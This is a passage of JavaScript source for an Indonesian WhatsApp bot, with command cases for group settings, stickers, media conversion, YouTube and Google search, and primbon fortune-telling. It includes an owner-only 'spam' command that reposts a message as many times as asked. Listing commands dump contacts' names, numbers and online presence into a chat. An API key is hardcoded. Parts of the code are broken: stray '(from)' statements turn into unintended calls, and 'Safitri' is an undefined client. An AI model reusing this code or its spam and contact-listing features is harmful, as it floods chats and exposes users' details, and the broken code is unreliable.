}
break
//════════════════════════════//
case 'editinfo': {
if (isBan) throw (from)

if (!m.isGroup) throw (from)
if (!isBotAdmins) throw (from)
if (!isAdmins) throw (from)
 if (args[0] === 'open'){
await BossRaehan.groupSettingUpdate(m.chat, 'unlocked').then((res) => anjay(`𝐒𝐮𝐤𝐬𝐞𝐬 𝐌𝐞𝐦𝐛𝐮𝐤𝐚 𝐄𝐝𝐢𝐭 𝐈𝐧𝐟𝐨 𝐆𝐫𝐨𝐮𝐩`)).catch((err) => anjay(jsonformat(err)))
 } else if (args[0] === 'close'){
await BossRaehan.groupSettingUpdate(m.chat, 'locked').then((res) => anjay(`𝐒𝐮𝐤𝐬𝐞𝐬 𝐌𝐞𝐧𝐮𝐭𝐮𝐩 𝐄𝐝𝐢𝐭 𝐈𝐧𝐟𝐨 𝐆𝐫𝐨𝐮𝐩`)).catch((err) => anjay(jsonformat(err)))
 } else {
 const anju = {
image:fs.readFileSync("./DataBoss/video/thumbnail.jpg"),
gifPlayback:false,
jpegThumbnail:Mthumb,
caption:  `𝐌𝐨𝐝𝐞 𝐄𝐝𝐢𝐭 𝐈𝐧𝐟𝐨`,
}
BossRaehan.sendMessage(m.chat, anju, `𝐌𝐨𝐝𝐞 𝐄𝐝𝐢𝐭 𝐈𝐧𝐟𝐨`, BossRaehan.user.name, m)
}
}
break
//════════════════════════════//
 case 'mute': {
 if (isBan) throw (from)

if (!m.isGroup) throw (from)
if (!isBotAdmins) throw (from)
if (!isAdmins) throw (from)
if (args[0] === "on") {
if (db.data.chats[m.chat].mute) return anjay(`Sudah Aktif Sebelumnya`)
db.data.chats[m.chat].mute = true
anjay(`${BossRaehan.user.name} telah di mute di group ini !`)
} else if (args[0] === "off") {
if (!db.data.chats[m.chat].mute) return anjay(`Sudah Tidak Aktif Sebelumnya`)
db.data.chats[m.chat].mute = false
anjay(`${BossRaehan.user.name} telah di unmute di group ini !`)
} else {
 const anaku = {
image:fs.readFileSync("./DataBoss/video/thumbnail.jpg"),
gifPlayback:false,
jpegThumbnail:Mthumb,
caption:  `Mute Bot`,
}
BossRaehan.sendMessage(m.chat, anaku, `Mute Bot`, BossRaehan.user.name, m)
}
 }
 break
//════════════════════════════//
case 'linkgroup': case 'linkgc': {
if (isBan) throw (from)

if (!m.isGroup) throw (from)
if (!isBotAdmins) throw (from)
let response = await BossRaehan.groupInviteCode(m.chat)
BossRaehan.sendText(m.chat, `https://chat.whatsapp.com/${response}\n\nLink Group : ${groupMetadata.subject}`, m, { detectLink: true })
}
break
//════════════════════════════//
case 'ephemeral': {
if (isBan) throw (from)

if (!m.isGroup) throw (from)
if (!isBotAdmins) throw (from)
if (!isAdmins) throw (from)
if (!text) throw 'Masukkan value enable/disable'
if (args[0] === 'enable') {
await BossRaehan.sendMessage(m.chat, { disappearingMessagesInChat: WA_DEFAULT_EPHEMERAL }).then((res) => anjay(jsonformat(res))).catch((err) => anjay(jsonformat(err)))
} else if (args[0] === 'disable') {
await BossRaehan.sendMessage(m.chat, { disappearingMessagesInChat: false }).then((res) => anjay(jsonformat(res))).catch((err) => anjay(jsonformat(err)))
}
}
break
//════════════════════════════//
case 'delete': case 'del': {
if (isBan) throw (from)

if (!m.quoted) throw false
let { chat, fromMe, id, isBaileys } = m.quoted
if (!isBaileys) throw 'Pesan tersebut bukan dikirim oleh bot!'
BossRaehan.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: true, id: m.quoted.id, participant: m.quoted.sender } })
}
break
//════════════════════════════//
case 'infochat': {
if (isBan) throw (from)

if (!m.quoted) anjay('Reply Pesan')
let msg = await m.getQuotedObj()
if (!m.quoted.isBaileys) throw 'Pesan tersebut bukan dikirim oleh bot!'
let teks = ''
for (let i of msg.userReceipt) {
let read = i.readTimestamp
let unread = i.receiptTimestamp
let waktu = read ? read : unread
teks += `⭔ @${i.userJid.split('@')[0]}\n`
teks += ` ┗━⭔ *Waktu :* ${moment(waktu * 1000).format('DD/MM/YY HH:mm:ss')} ⭔ *Status :* ${read ? 'Dibaca' : 'Terkirim'}\n\n`
}
BossRaehan.sendTextWithMentions(m.chat, teks, m)
}
break
//════════════════════════════//
case 'q': case 'quoted': {
if (isBan) throw (from)

if (!m.quoted) return anjay('Reply Pesannya!!')
let wokwol = await BossRaehan.serializeM(await m.getQuotedObj())
if (!wokwol.quoted) return anjay('Pesan Yang anda reply tidak mengandung reply')
await wokwol.quoted.copyNForward(m.chat, true)
}
break
//════════════════════════════//
case 'listpc': {
if (isBan) throw (from)

 let anu = await store.chats.all().filter(v => v.id.endsWith('.net')).map(v => v.id)
 let teks = `⬣ *LIST PERSONAL CHAT*\n\nTotal Chat : ${anu.length} Chat\n\n`
 for (let i of anu) {
 let nama = store.messages[i].array[0].pushName
 teks += `⬡ *Nama :* ${nama}\n⬡ *User :* @${i.split('@')[0]}\n⬡ *Chat :* https://wa.me/${i.split('@')[0]}\n\n────────────────────────\n\n`
 }
 BossRaehan.sendTextWithMentions(m.chat, teks, m)
 }
 break
//════════════════════════════//
case 'listgc': {
if (isBan) throw (from)

 let anu = await store.chats.all().filter(v => v.id.endsWith('@g.us')).map(v => v.id)
 let teks = `⬣ *LIST GROUP CHAT*\n\nTotal Group : ${anu.length} Group\n\n`
 for (let i of anu) {
 let metadata = await BossRaehan.groupMetadata(i)
 teks += `⬡ *Nama :* ${metadata.subject}\n⬡ *Owner :* ${metadata.owner !== undefined ? '@' + metadata.owner.split`@`[0] : 'Tidak diketahui'}\n⬡ *ID :* ${metadata.id}\n⬡ *Dibuat :* ${moment(metadata.creation * 1000).tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss')}\n⬡ *Member :* ${metadata.participants.length}\n\n────────────────────────\n\n`
 }
 BossRaehan.sendTextWithMentions(m.chat, teks, m)
 }
 break
//════════════════════════════//
 case 'listonline': case 'liston': {
 if (isBan) throw (from)

let id = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : m.chat
let online = [...Object.keys(store.presences[id]), botNumber]
BossRaehan.sendText(m.chat, 'List Online:\n\n' + online.map(v => '⭔ @' + v.replace(/@.+/, '')).join`\n`, m, { mentions: online })
 }
 break
//════════════════════════════//
case 'sticker': case 's': case 'stickergif': case 'sgif': {
if (isBan) throw (from)

if (!quoted) throw `𝐁𝐚𝐥𝐚𝐬 𝐕𝐢𝐝𝐞𝐨/𝐅𝐨𝐭𝐨 𝐃𝐞𝐧𝐠𝐚𝐧 𝐂𝐚𝐩𝐭𝐢𝐨𝐧 ${prefix + command}`
if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await BossRaehan.sendImageAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else if (/video/.test(mime)) {
let media = await quoted.download()
let encmedia = await BossRaehan.sendVideoAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else {
throw `𝐊𝐢𝐫𝐢𝐦 𝐅𝐨𝐭𝐨/𝐕𝐢𝐝𝐞𝐨 𝐃𝐞𝐧𝐠𝐚𝐧 𝐂𝐚𝐩𝐭𝐢𝐨𝐧 ${prefix + command}\n𝐃𝐮𝐫𝐚𝐬𝐢 𝐕𝐢𝐝𝐞𝐨 1-30 𝐃𝐞𝐭𝐢𝐤`
}
}
break
//════════════════════════════//
case 'ebinary': {
if (isBan) throw (from)

if (!text) throw `Example : ${prefix + command} text`
let { eBinary } = require('./DataBoss/lib/binary')
let eb = await eBinary(text)
anjay(eb)
}
break
//════════════════════════════//
case 'dbinary': {
if (isBan) throw (from)

if (!text) throw `Example : ${prefix + command} text`
let { dBinary } = require('./DataBoss/lib/binary')
let db = await dBinary(text)
anjay(db)
}
break
//════════════════════════════//
case 'emojimix': {
if (isBan) throw (from)

let [emoji1, emoji2] = text.split`+`
if (!emoji1) throw `Example : ${prefix + command} 😅+🤔`
if (!emoji2) throw `Example : ${prefix + command} 😅+🤔`
let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
for (let res of anu.results) {
let encmedia = await BossRaehan.sendImageAsSticker(m.chat, res.url, m, { packname: global.packname, author: global.author, categories: res.tags })
await fs.unlinkSync(encmedia)
}
}
break
//════════════════════════════//
case 'emojimix2': {
if (isBan) throw (from)

if (!text) throw `Example : ${prefix + command} 😅`
let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(text)}`)
for (let res of anu.results) {
let encmedia = await BossRaehan.sendImageAsSticker(m.chat, res.url, m, { packname: global.packname, author: global.author, categories: res.tags })
await fs.unlinkSync(encmedia)
}
}
break
//════════════════════════════//
 case 'attp': case 'ttp': {
 if (isBan) throw (from)

 if (!text) throw `Example : ${prefix + command} text`
 await BossRaehan.sendMedia(m.chat, `https://xteam.xyz/${command}?file&text=${text}`, 'Anjas', 'Kelaz', m, {asSticker: true})
 }
 break
case 'spam': {
if (!isCreator) return
if (isBan) throw (from)

if (!m.quoted) return anjay("Reply pesanya!")
if (args.length == 0) return anjay(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
quoted.copyNForward(m.chat, true)
}
} 
break
//════════════════════════════//
 /*case 'smeme': case 'stickmeme': case 'stikmeme': case 'stickermeme': case 'stikermeme': {
 if (isBan) throw (from)

let respond = `Kirim/reply image/sticker dengan caption ${prefix + command} text1|text2`
if (!/image/.test(mime)) throw respond
if (!text) throw respond
atas = text.split('|')[0] ? text.split('|')[0] : '-'
bawah = text.split('|')[1] ? text.split('|')[1] : '-'
let dwnld = await quoted.download()
let { floNime } = require('./DataBoss/lib/uploader')
let fatGans = await floNime(dwnld)
let smeme = `https://api.memegen.link/images/custom/${encodeURIComponent(atas)}/${encodeURIComponent(bawah)}.png?background=${fatGans.result.url}`
let FaTiH = await BossRaehan.sendImageAsSticker(m.chat, smeme, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(FaTiH)
}
 break */
//════════════════════════════// 
case 'smeme': case 'stickermeme': case 'stickmeme': {
if (isBan) throw (from)

if (text.includes('|')) return anjay(`Kirim/Reply Foto Dengan Caption ${prefix + command} *teks*`)
if (!/image/.test(mime)) return anjay(`Kirim/Reply Foto Dengan Caption ${prefix + command} *teks*`)
(from)
arg = args.join(' ')
mee = await BossRaehan.downloadAndSaveMediaMessage(quoted)
const { TelegraPh } = require('./DataBoss/lib/uploader')
mem = await TelegraPh(mee)
meme = `https://api.memegen.link/images/custom/-/${arg}.png?background=${mem}`
memek = await BossRaehan.sendImageAsSticker(m.chat, meme, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(memek)
}
break 
case 'toimage': case 'toimg': {
if (isBan) throw (from)

if (!quoted) throw '𝐑𝐞𝐩𝐥𝐲 𝐈𝐦𝐚𝐠𝐞𝐧𝐲𝐚'
if (!/webp/.test(mime)) throw `Balas sticker dengan caption *${prefix + command}*`
let media = await BossRaehan.downloadAndSaveMediaMessage(quoted)
let ran = await getRandom('.png')
exec(`ffmpeg -i ${media} ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) throw err
let buffer = fs.readFileSync(ran)
BossRaehan.sendMessage(m.chat, { image: buffer }, { quoted: Raehan })
fs.unlinkSync(ran)
})
}
break
//════════════════════════════//
case 'tomp4': case 'tovideo': {
if (isBan) throw (from)

if (!quoted) throw '𝐑𝐞𝐩𝐥𝐲 𝐈𝐦𝐚𝐠𝐞/𝐕𝐢𝐝𝐞𝐨𝐧𝐲𝐚'
if (!/webp/.test(mime)) throw `*reply sticker with caption* *${prefix + command}*`
let { webp2mp4File } = require('./DataBoss/lib/uploader')
let media = await BossRaehan.downloadAndSaveMediaMessage(quoted)
let webpToMp4 = await webp2mp4File(media)
await BossRaehan.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' } }, { quoted: Raehan })
await fs.unlinkSync(media)
}
break
case 'toaud': case 'toaudio': {
if (isBan) throw (from)

if (!/video/.test(mime) && !/audio/.test(mime)) throw `*Send/Reply the Video/Audio You Want to Use as Audio With Caption* ${prefix + command}`
if (!quoted) throw `*Send/Reply the Video/Audio You Want to Use as Audio With Caption* ${prefix + command}`
let media = await quoted.download()
let { toAudio } = require('./DataBoss/lib/converter')
let audio = await toAudio(media, 'mp4')
BossRaehan.sendMessage(m.chat, {audio: audio, mimetype: 'audio/mpeg'}, { quoted : Raehan })
}
break
case 'tomp3': {
if (isBan) throw (from)

if (/document/.test(mime)) throw `*Send/Reply Video/Audio You Want to Convert into MP3 With Caption* ${prefix + command}`
if (!/video/.test(mime) && !/audio/.test(mime)) throw `*Send/Reply Video/Audio You Want to Convert into MP3 With Caption* ${prefix + command}`
if (!quoted) throw `*Send/Reply Video/Audio You Want to Convert into MP3 With Caption* ${prefix + command}`
let media = await quoted.download()
let { toAudio } = require('./DataBoss/lib/converter')
let audio = await toAudio(media, 'mp4')
BossRaehan.sendMessage(m.chat, {document: audio, mimetype: 'audio/mpeg', fileName: `Convert By ${BossRaehan.user.name}.mp3`}, { quoted : Raehan })
}
break
case 'tovn': case 'toptt': {
if (isBan) throw (from)

if (!/video/.test(mime) && !/audio/.test(mime)) throw `*Reply Video/Audio That You Want To Be VN With Caption* ${prefix + command}`
if (!quoted) throw `*Reply Video/Audio That You Want To Be VN With Caption* ${prefix + command}`
(from)
let media = await quoted.download()
let { toPTT } = require('./DataBoss/lib/converter')
let audio = await toPTT(media, 'mp4')
BossRaehan.sendMessage(m.chat, {audio: audio, mimetype:'audio/mpeg', ptt:true }, {quoted: Raehan})
}
break
case 'togif': {
if (isBan) throw (from)

if (!quoted) throw 'Reply Image'
if (!/webp/.test(mime)) throw `*reply sticker with caption* *${prefix + command}*`
 let { webp2mp4File } = require('./DataBoss/lib/uploader')
let media = await BossRaehan.downloadAndSaveMediaMessage(quoted)
let webpToMp4 = await webp2mp4File(media)
await BossRaehan.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' }, gifPlayback: true }, { quoted: Raehan })
await fs.unlinkSync(media)
}
break
//════════════════════════════//
case 'tourl': {
if (isBan) throw (from)

let { UploadFileUgu, webp2mp4File, TelegraPh } = require('./DataBoss/lib/uploader')
let media = await BossRaehan.downloadAndSaveMediaMessage(quoted)
if (/image/.test(mime)) {
let anu = await TelegraPh(media)
m.reply(util.format(anu))
} else if (!/image/.test(mime)) {
let anu = await UploadFileUgu(media)
m.reply(util.format(anu))
}
await fs.unlinkSync(media)
}
break
//════════════════════════════//
case 'yts': case 'ytsearch': {
if (isBan) throw (from)

if (!text) throw `Example : ${prefix + command} story wa anime`
let yts = require("yt-search")
let search = await yts(text)
let teks = 'YouTube Search\n\n Result From '+text+'\n\n'
let no = 1
for (let i of search.all) {
teks += `⭔ No : ${no++}\n⭔ Type : ${i.type}\n⭔ Video ID : ${i.videoId}\n⭔ Title : ${i.title}\n⭔ Views : ${i.views}\n⭔ Duration : ${i.timestamp}\n⭔ Upload At : ${i.ago}\n⭔ Author : ${i.author.name}\n⭔ Url : ${i.url}\n\n─────────────────\n\n`
}
BossRaehan.sendMessage(m.chat, { image: { url: search.all[0].thumbnail },caption: teks }, { quoted: Raehan })
}
break
//════════════════════════════//
case 'google': {
if (isBan) throw (from)

if (!text) throw `Example : ${prefix + command} fatih arridho`
let google = require('google-it')
google({'query': text}).then(res => {
let teks = `Google Search From : ${text}\n\n`
for (let g of res) {
teks += `⭔ *Title* : ${g.title}\n`
teks += `⭔ *Description* : ${g.snippet}\n`
teks += `⭔ *Link* : ${g.link}\n\n────────────────────────\n\n`
} 
anjay(teks)
})
}
break
//════════════════════════════//
case 'gimage': {
if (isBan) throw (from)

if (!text) throw `Example : ${prefix + command} kaori cicak`
let gis = require('g-i-s')
gis(text, async (error, result) => {
n = result
images = n[Math.floor(Math.random() * n.length)].url
const mllo = {
image: { url: images },
caption: `*-------「 GIMAGE SEARCH 」-------*
🤠 *Query* : ${text}
🔗 *Media Url* : ${images}`
}
BossRaehan.sendMessage(m.chat, mllo, { quoted: Raehan })
})
}
break
//════════════════════════════//
case 'play': case 'ytplay': {
if (isBan) throw (from)

if (!text) throw `Example : ${prefix + command} story wa anime`
let yts = require("yt-search")
let search = await yts(text)
let anu = search.videos[Math.floor(Math.random() * search.videos.length)]
const kals = {
image: { url: anu.thumbnail },
caption: `
⭔ Title : ${anu.title}
⭔ Ext : Search
⭔ ID : ${anu.videoId}
⭔ Duration : ${anu.timestamp}
⭔ Viewers : ${anu.views}
⭔ Upload At : ${anu.ago}
⭔ Author : ${anu.author.name}
⭔ Channel : ${anu.author.url}
⭔ Description : ${anu.description}
⭔ Url : ${anu.url}`
}
Safitri.sendMessage(m.chat, kals, { quoted: Raehan })
}
break
//════════════════════════════//
case 'ytmp3': case 'ytaudio': {
if (isBan) throw (from)

let { yta } = require('./DataBoss/lib/y2mate')
if (!text) throw `Example : ${prefix + command} https://youtube.com/watch?v=PtFMh6Tccag%27 128kbps`
let quality = args[1] ? args[1] : '128kbps'
let media = await yta(text, quality)
if (media.filesize >= 100000) return anjay('File Melebihi Batas '+util.format(media))
Safitri.sendImage(m.chat, media.thumb, `⭔ Title : ${media.title}\n⭔ File Size : ${media.filesizeF}\n⭔ Url : ${isUrl(text)}\n⭔ Ext : MP3\n⭔ Resolusi : ${args[1] || '128kbps'}`, m)
Safitri.sendMessage(m.chat, { audio: { url: media.dl_link }, mimetype: 'audio/mpeg', fileName: `${media.title}.mp3` }, { quoted: Raehan })
}
break
//════════════════════════════//
case 'ytmp4': case 'ytvideo': {
if (isBan) throw (from)

let { ytv } = require('./DataBoss/lib/y2mate')
if (!text) throw `Example : ${prefix + command} https://youtube.com/watch?v=PtFMh6Tccag%27 360p`
let quality = args[1] ? args[1] : '360p'
let media = await ytv(text, quality)
if (media.filesize >= 100000) return anjay('File Melebihi Batas '+util.format(media))
Safitri.sendMessage(m.chat, { video: { url: media.dl_link }, mimetype: 'video/mp4', fileName: `${media.title}.mp4`, caption: `⭔ Title : ${media.title}\n⭔ File Size : ${media.filesizeF}\n⭔ Url : ${isUrl(text)}\n⭔ Ext : MP3\n⭔ Resolusi : ${args[1] || '360p'}` }, { quoted: Raehan })
}
break
//════════════════════════════//
case 'getmusic': {
if (isBan) throw (from)

let { yta } = require('./DataBoss/lib/y2mate')
if (!text) throw `Example : ${prefix + command} 1`
if (!m.quoted) return anjay('Reply Pesan')
let urls = quoted.text.match(new RegExp(/(?:https?:\/\/)?(?:youtu\.be\/|(?:www\.|m\.)?youtube\.com\/(?:watch|v|embed|shorts)(?:\.php)?(?:\?.*v=|\/))([a-zA-Z0-9\_-]+)/, 'gi'))
if (!urls) throw `Mungkin pesan yang anda reply tidak mengandung result ytsearch`
let quality = args[1] ? args[1] : '128kbps'
let media = await yta(urls[text - 1], quality)
if (media.filesize >= 100000) return anjay('File Melebihi Batas '+util.format(media))
BossRaehan.sendImage(m.chat, media.thumb, `⭔ Title : ${media.title}\n⭔ File Size : ${media.filesizeF}\n⭔ Url : ${urls[text - 1]}\n⭔ Ext : MP3\n⭔ Resolusi : ${args[1] || '128kbps'}`, m)
BossRaehan.sendMessage(m.chat, { audio: { url: media.dl_link }, mimetype: 'audio/mpeg', fileName: `${media.title}.mp3` }, { quoted: Raehan })
}
break
//════════════════════════════//
case 'getvideo': {
if (isBan) throw (from)

let { ytv } = require('./DataBoss/lib/y2mate')
if (!text) throw `Example : ${prefix + command} 1`
if (!m.quoted) return anjay('Reply Pesan')
let urls = quoted.text.match(new RegExp(/(?:https?:\/\/)?(?:youtu\.be\/|(?:www\.|m\.)?youtube\.com\/(?:watch|v|embed|shorts)(?:\.php)?(?:\?.*v=|\/))([a-zA-Z0-9\_-]+)/, 'gi'))
if (!urls) throw `Mungkin pesan yang anda reply tidak mengandung result ytsearch`
let quality = args[1] ? args[1] : '360p'
let media = await ytv(urls[text - 1], quality)
if (media.filesize >= 100000) return anjay('File Melebihi Batas '+util.format(media))
BossRaehan.sendMessage(m.chat, { video: { url: media.dl_link }, mimetype: 'video/mp4', fileName: `${media.title}.mp4`, caption: `⭔ Title : ${media.title}\n⭔ File Size : ${media.filesizeF}\n⭔ Url : ${urls[text - 1]}\n⭔ Ext : MP3\n⭔ Resolusi : ${args[1] || '360p'}` }, { quoted: Raehan })
}
break
//════════════════════════════//
case 'pinterest': {
if (isBan) throw (from)

let { pinterest } = require('./DataBoss/lib/scraper')
anu = await pinterest(text)
result = anu[Math.floor(Math.random() * anu.length)]
BossRaehan.sendMessage(m.chat, { image: { url: result }, caption: '⭔ Media Url : '+result }, { quoted: Raehan })
}
break
//════════════════════════════//
case 'couple': {
if (isBan) throw (from)

let anu = await fetchJson('https://raw.githubusercontent.com/iamriz7/kopel_/main/kopel.json')
let random = anu[Math.floor(Math.random() * anu.length)]
BossRaehan.sendMessage(m.chat, { image: { url: random.male }, caption: `Couple Male` }, { quoted: Raehan })
BossRaehan.sendMessage(m.chat, { image: { url: random.female }, caption: `Couple Female` }, { quoted: Raehan })
}
break
//════════════════════════════//
case 'coffe': case 'kopi': {
if (isBan) throw (from)

const ko = {
image: { url: 'https://coffee.alexflipnote.dev/random' },
caption: `☕ Random Coffe`
}
BossRaehan.sendMessage(m.chat, ko, { quoted: Raehan })
}
break
//════════════════════════════//
case 'wallpaper': {
if (isBan) throw (from)

if (!text) throw 'Masukkan Query Title'
let { wallpaper } = require('./DataBoss/lib/scraper')
anu = await wallpaper(text)
result = anu[Math.floor(Math.random() * anu.length)]
const mlo = {
image: { url: result.image[0] },
caption: `⭔ Title : ${result.title}\n⭔ Category : ${result.type}\n⭔ Detail : ${result.source}\n⭔ Media Url : ${result.image[2] || result.image[1] || result.image[0]}`
}
BossRaehan.sendMessage(m.chat, mlo, { quoted: Raehan })
}
break
//════════════════════════════//
case 'wikimedia': {
if (isBan) throw (from)

if (!text) throw 'Masukkan Query Title'
let { wikimedia } = require('./DataBoss/lib/scraper')
anu = await wikimedia(text)
result = anu[Math.floor(Math.random() * anu.length)]
const mbk = {
image: { url: result.image },
caption: `⭔ Title : ${result.title}\n⭔ Source : ${result.source}\n⭔ Media Url : ${result.image}`
}
BossRaehan.sendMessage(m.chat, mbk, { quoted: Raehan })
}
break
//════════════════════════════//
case 'quotesanime': case 'quoteanime': {
if (isBan) throw (from)

let { quotesAnime } = require('./DataBoss/lib/scraper')
let anu = await quotesAnime()
result = anu[Math.floor(Math.random() * anu.length)]

const anualas = {
text: `~_${result.quotes}_\n\nBy '${result.karakter}', ${result.anime}\n\n- ${result.up_at}`
}
BossRaehan.sendMessage(m.chat, anualas, { quoted: Raehan })
}
break
//════════════════════════════//
case 'nomerhoki': case 'nomorhoki': {
if (isBan) throw (from)

if (!Number(text)) throw `Example : ${prefix + command} 6281528628870`
let anu = await primbon.nomer_hoki(Number(text))
if (anu.status == false) return anjay(anu.message)
BossRaehan.sendText(m.chat, `⭔ *Nomor HP :* ${anu.message.nomer_hp}\n⭔ *Angka Shuzi :* ${anu.message.angka_shuzi}\n⭔ *Energi Positif :*\n- Kekayaan : ${anu.message.energi_positif.kekayaan}\n- Kesehatan : ${anu.message.energi_positif.kesehatan}\n- Cinta : ${anu.message.energi_positif.cinta}\n- Kestabilan : ${anu.message.energi_positif.kestabilan}\n- Persentase : ${anu.message.energi_positif.persentase}\n⭔ *Energi Negatif :*\n- Perselisihan : ${anu.message.energi_negatif.perselisihan}\n- Kehilangan : ${anu.message.energi_negatif.kehilangan}\n- Malapetaka : ${anu.message.energi_negatif.malapetaka}\n- Kehancuran : ${anu.message.energi_negatif.kehancuran}\n- Persentase : ${anu.message.energi_negatif.persentase}`, m)
}
break
//════════════════════════════//
case 'artimimpi': case 'tafsirmimpi': {
if (isBan) throw (from)

if (!text) throw `Example : ${prefix + command} belanja`
let anu = await primbon.tafsir_mimpi(text)
if (anu.status == false) return anjay(anu.message)
BossRaehan.sendText(m.chat, `⭔ *Mimpi :* ${anu.message.mimpi}\n⭔ *Arti :* ${anu.message.arti}\n⭔ *Solusi :* ${anu.message.solusi}`, m)
}
break
//════════════════════════════//
case 'ramalanjodoh': case 'ramaljodoh': {
if (isBan) throw (from)

if (!text) throw `Example : ${prefix + command} BossRaehan, 7, 7, 2005, Putri, 16, 11, 2004`
let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
let anu = await primbon.ramalan_jodoh(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
if (anu.status == false) return anjay(anu.message)
BossRaehan.sendText(m.chat, `⭔ *Nama Anda :* ${anu.message.nama_anda.nama}\n⭔ *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n⭔ *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n⭔ *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//════════════════════════════//
case 'ramalanjodohbali': case 'ramaljodohbali': {
if (isBan) throw (from)

if (!text) throw `Example : ${prefix + command} BossRaehan, 7, 7, 2005, Putri, 16, 11, 2004`
let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
let anu = await primbon.ramalan_jodoh_bali(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
if (anu.status == false) return anjay(anu.message)
BossRaehan.sendText(m.chat, `⭔ *Nama Anda :* ${anu.message.nama_anda.nama}\n⭔ *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n⭔ *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n⭔ *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//════════════════════════════//
case 'suamiistri': {
if (isBan) throw (from)

if (!text) throw `Example : ${prefix + command} BossRaehan, 7, 7, 2005, Putri, 16, 11, 2004`
let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
let anu = await primbon.suami_istri(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
if (anu.status == false) return anjay(anu.message)
BossRaehan.sendText(m.chat, `⭔ *Nama Suami :* ${anu.message.suami.nama}\n⭔ *Lahir Suami :* ${anu.message.suami.tgl_lahir}\n⭔ *Nama Istri :* ${anu.message.istri.nama}\n⭔ *Lahir Istri :* ${anu.message.istri.tgl_lahir}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//════════════════════════════//
case 'ramalancinta': case 'ramalcinta': {
if (isBan) throw (from)

if (!text) throw `Example : ${prefix + command} BossRaehan, 7, 7, 2005, Putri, 16, 11, 2004`
let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
let anu = await primbon.ramalan_cinta(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
if (anu.status == false) return anjay(anu.message)
BossRaehan.sendText(m.chat, `⭔ *Nama Anda :* ${anu.message.nama_anda.nama}\n⭔ *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n⭔ *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n⭔ *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n⭔ *Sisi Positif :* ${anu.message.sisi_positif}\n⭔ *Sisi Negatif :* ${anu.message.sisi_negatif}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//════════════════════════════//
case 'artinama': {
if (isBan) throw (from)

if (!text) throw `Example : ${prefix + command} BossRaehan Gans`
let anu = await primbon.arti_nama(text)
if (anu.status == false) return anjay(anu.message)
BossRaehan.sendText(m.chat, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Arti :* ${anu.message.arti}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//════════════════════════════//
case 'kecocokannama': case 'cocoknama': {
if (isBan) throw (from)

if (!text) throw `Example : ${prefix + command} BossRaehan, 7, 7, 2005`
let [nama, tgl, bln, thn] = text.split`,`
let anu = await primbon.kecocokan_nama(nama, tgl, bln, thn)
if (anu.status == false) return anjay(anu.message)
BossRaehan.sendText(m.chat, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Life Path :* ${anu.message.life_path}\n⭔ *Destiny :* ${anu.message.destiny}\n⭔ *Destiny Desire :* ${anu.message.destiny_desire}\n⭔ *Personality :* ${anu.message.personality}\n⭔ *Persentase :* ${anu.message.persentase_kecocokan}`, m)
}
break
//════════════════════════════//
case 'kecocokanpasangan': case 'cocokpasangan': case 'pasangan': {
if (isBan) throw (from)

if (!text) throw `Example : ${prefix + command} BossRaehan|Putri`
let [nama1, nama2] = text.split`|`
let anu = await primbon.kecocokan_nama_pasangan(nama1, nama2)
if (anu.status == false) return anjay(anu.message)
BossRaehan.sendImage(m.chat,anu.message.gambar, `⭔ *Nama Anda :* ${anu.message.nama_anda}\n⭔ *Nama Pasangan :* ${anu.message.nama_pasangan}\n⭔ *Sisi Positif :* ${anu.message.sisi_positif}\n⭔ *Sisi Negatif :* ${anu.message.sisi_negatif}`, m)
}
break
//════════════════════════════//
case 'jadianpernikahan': case 'jadiannikah': {
if (isBan) throw (from)

if (!text) throw `Example : ${prefix + command} 6, 12, 2020`
let [tgl, bln, thn] = text.split`,`
